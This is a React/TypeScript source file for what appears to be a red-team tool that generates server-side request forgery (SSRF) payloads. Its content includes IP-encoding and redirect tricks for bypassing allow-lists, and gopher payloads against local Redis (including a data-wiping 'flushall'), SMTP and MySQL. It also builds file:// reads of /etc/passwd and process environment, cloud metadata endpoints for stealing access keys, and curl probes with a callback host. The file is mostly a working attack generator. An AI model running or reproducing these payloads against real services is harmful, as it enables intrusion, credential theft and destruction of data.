import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  CodeBlock,
  CopyChip,
  DownloadButton,
  SectionTitle,
  Select,
  TextInput,
  KVTable,
} from '@/components/ui';
import { METADATA_TARGETS, SSRF_PARAMS } from '@/lib/redteam-data';
import { DEFAULT_CALLBACK_HOST, DEFAULT_TARGET } from '@/tools/registry';

type Surface = 'http' | 'gopher' | 'file' | 'dict' | 'ldap';
type Internal = 'metadata' | 'localhost' | 'cidr' | 'custom';

const SURFACES = [
  { value: 'http', label: 'http:// https:// only' },
  { value: 'gopher', label: 'gopher:// (raw TCP)' },
  { value: 'file', label: 'file:// (local read)' },
  { value: 'dict', label: 'dict:// (banner grab)' },
  { value: 'ldap', label: 'ldap:// (search)' },
] as const;

const INTERNALS = [
  { value: 'metadata', label: 'Cloud metadata service' },
  { value: 'localhost', label: 'Localhost service' },
  { value: 'cidr', label: 'Internal CIDR host' },
  { value: 'custom', label: 'Custom target' },
] as const;

const BYPASSES: Array<{ id: string; label: string; note: string; apply: (ip: string, port: string) => string }> = [
  { id: 'decimal', label: 'Decimal IP', note: '2130706433 — integer form the parser still resolves', apply: (_ip, p) => `http://2130706433:${p}/` },
  { id: 'octal', label: 'Octal IP', note: '0177.0.0.1 — legacy inet_aton octal parsing', apply: (_ip, p) => `http://0177.0.0.1:${p}/` },
  { id: 'hex', label: 'Hex IP', note: '0x7f000001 — accepted by many URL libraries', apply: (_ip, p) => `http://0x7f000001:${p}/` },
  { id: 'ipv6', label: 'IPv6-mapped', note: '[::ffff:127.0.0.1] — bypasses IPv4 string checks', apply: (_ip, p) => `http://[::ffff:127.0.0.1]:${p}/` },
  { id: 'short', label: '127.1 shorthand', note: 'Short-form IPv4 that resolves to 127.0.0.1', apply: (_ip, p) => `http://127.1:${p}/` },
  { id: 'dns', label: 'DNS name trick', note: 'localtest.me / 127.0.0.1.nip.io resolve to loopback', apply: (ip, p) => `http://${ip.replace(/\./g, '-')}.nip.io:${p}/` },
  { id: 'userinfo', label: '@ userinfo', note: 'Allow-list sees trusted.com, parser hits the real host', apply: (ip, p) => `http://${DEFAULT_TARGET}@${ip}:${p}/` },
  { id: 'redirect', label: 'Redirect wrapper', note: 'Trusted host issues a 302 to the internal target', apply: (ip, p) => `http://${DEFAULT_TARGET}/redirect?url=http://${ip}:${p}/` },
  { id: 'redir-chain', label: 'Open-redirect chain', note: 'Two hops to defeat first-request-only validation', apply: (ip, p) => `https://${DEFAULT_TARGET}/r?u=//${DEFAULT_TARGET}/r?u=//${ip}:${p}` },
  { id: 'shortener', label: 'URL shortener', note: 'Placeholder short link — resolve once, repoint to the internal host', apply: (_ip, p) => `https://short.example.com/abc123 → http://127.0.0.1:${p}/` },
  { id: 'enclose', label: 'Enclosed alphanumerics', note: 'Unicode digits normalised late by some resolvers', apply: (_ip, p) => `http://①②⑦.０.０.１:${p}/` },
];

export default function SsrfPayloadBuilder() {
  const [surface, setSurface] = useState<Surface>('http');
  const [internal, setInternal] = useState<Internal>('metadata');
  const [ip, setIp] = useState('127.0.0.1');
  const [cidrHost, setCidrHost] = useState('10.20.0.15');
  const [port, setPort] = useState('80');
  const [custom, setCustom] = useState(`http://${DEFAULT_CALLBACK_HOST}/probe`);
  const [param, setParam] = useState('url');
  const [enabled, setEnabled] = useState<string[]>(['decimal', 'ipv6', 'dns', 'userinfo']);

  const baseTarget = useMemo(() => {
    if (internal === 'metadata') return { host: '169.254.169.254', path: METADATA_TARGETS[0].url };
    if (internal === 'cidr') return { host: cidrHost.trim() || '10.20.0.15', path: `http://${cidrHost.trim() || '10.20.0.15'}:${port}/` };
    if (internal === 'custom') return { host: 'custom', path: custom.trim() };
    return { host: ip.trim() || '127.0.0.1', path: `http://${ip.trim() || '127.0.0.1'}:${port}/` };
  }, [internal, ip, port, cidrHost, custom]);

  const payloads = useMemo(() => {
    const p = port.trim() || '80';
    const raw = baseTarget.path;
    const groups: Array<{ title: string; items: string[] }> = [];

    const shape = (u: string): string => {
      if (surface === 'http') return u;
      if (surface === 'gopher') return `gopher://${baseTarget.host}:${p}/_${u.replace(/^https?:\/\//, '')}`;
      if (surface === 'file') return `file://${u.startsWith('/') ? u : '/etc/passwd'}`;
      if (surface === 'dict') return `dict://${baseTarget.host}:${p}/INFO`;
      return `ldap://${baseTarget.host}:${p}/%2A`;
    };

    groups.push({ title: 'Direct', items: [shape(raw)] });
    if (surface === 'gopher') {
      groups.push({
        title: 'gopher TCP payloads',
        items: [
          `gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A`,
          `gopher://127.0.0.1:25/_EHLO%20${DEFAULT_TARGET}%0D%0A`,
          `gopher://127.0.0.1:3306/_%2A%00%00%00`,
        ],
      });
    }
    if (surface === 'file') {
      groups.push({ title: 'Local file probes', items: ['file:///etc/passwd', 'file:///proc/self/environ', 'file:///c:/windows/win.ini'] });
    }
    if (internal === 'metadata') {
      groups.push({ title: 'Metadata endpoints', items: METADATA_TARGETS.map((m) => m.url) });
    }
    const bypassItems = BYPASSES.filter((b) => enabled.includes(b.id)).map((b) => b.apply(baseTarget.host, p));
    if (bypassItems.length) groups.push({ title: 'Parser bypasses', items: bypassItems });
    return groups;
  }, [surface, internal, baseTarget, port, enabled]);

  const flat = payloads.map((g) => [`# ${g.title}`, ...g.items, ''].join('\n')).join('\n');
  const probes = useMemo(
    () => payloads.map((g) => `curl -sS --max-time 5 -o /dev/null -w '%{http_code} %{size_download}\\n' '${g.items[0]}'`).join('\n'),
    [payloads],
  );

  return (
    <>
      <Card title="Target">
        <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
          <Select label="Target surface" value={surface} onChange={setSurface} options={SURFACES.map((s) => ({ value: s.value, label: s.label }))} />
          <Select label="Internal target" value={internal} onChange={setInternal} options={INTERNALS.map((i) => ({ value: i.value, label: i.label }))} />
          <TextInput label="Vulnerable parameter" value={param} onChange={setParam} mono hint={`Common: ${SSRF_PARAMS.slice(0, 6).join(', ')}…`} />
          {internal === 'localhost' && <TextInput label="Loopback IP" value={ip} onChange={setIp} mono />}
          {internal === 'cidr' && <TextInput label="Internal host" value={cidrHost} onChange={setCidrHost} mono hint="From a 10.x / 172.16.x / 192.168.x range" />}
          {internal !== 'metadata' && internal !== 'custom' && <TextInput label="Port" value={port} onChange={setPort} mono />}
          {internal === 'custom' && <TextInput label="Custom URL" value={custom} onChange={setCustom} mono />}
        </div>
        <div className="mt-4">
          <SectionTitle>Bypass families</SectionTitle>
          <div className="grid gap-2.5 sm:grid-cols-2 lg:grid-cols-3">
            {BYPASSES.map((b) => (
              <Checkbox
                key={b.id}
                checked={enabled.includes(b.id)}
                onChange={(on) => setEnabled((prev) => (on ? [...prev, b.id] : prev.filter((x) => x !== b.id)))}
                label={b.label}
                description={b.note}
              />
            ))}
          </div>
        </div>
      </Card>

      <Card title="Payloads" action={<DownloadButton text={flat} filename="ssrf-payloads.txt" label="Download .txt" />}>
        <div className="flex flex-col gap-5">
          {payloads.map((g) => (
            <div key={g.title}>
              <SectionTitle>{g.title}</SectionTitle>
              <div className="flex flex-col gap-1.5">
                {g.items.map((u, i) => (
                  <CopyChip key={i} text={u} />
                ))}
              </div>
            </div>
          ))}
        </div>
      </Card>

      <Card title="Verification">
        <CodeBlock code={probes} label="curl probes" />
        <div className="mt-4">
          <KVTable
            rows={[
              ['Parameter to test', param],
              ['Internal host', baseTarget.host],
              ['Response length delta', 'Compare %{size_download} between internal and a control URL'],
              ['Blind callback', `Watch ${DEFAULT_CALLBACK_HOST} for DNS/HTTP hits when egress is allowed`],
            ]}
          />
        </div>
        <div className="mt-4">
          <Callout tone="warn" title="What a hit looks like">
            A working SSRF shows a response-size difference against a control fetch, a 200 from a host the app should not
            reach, or a metadata JSON body (AccessKeyId, role ARNs). With egress filtering, the probe only lands in your
            listener — a DNS A record for the callback host is sufficient proof. For gopher, confirmation is a banner or a
            protocol error from the target service rather than a timeout.
          </Callout>
        </div>
      </Card>
    </>
  );
}
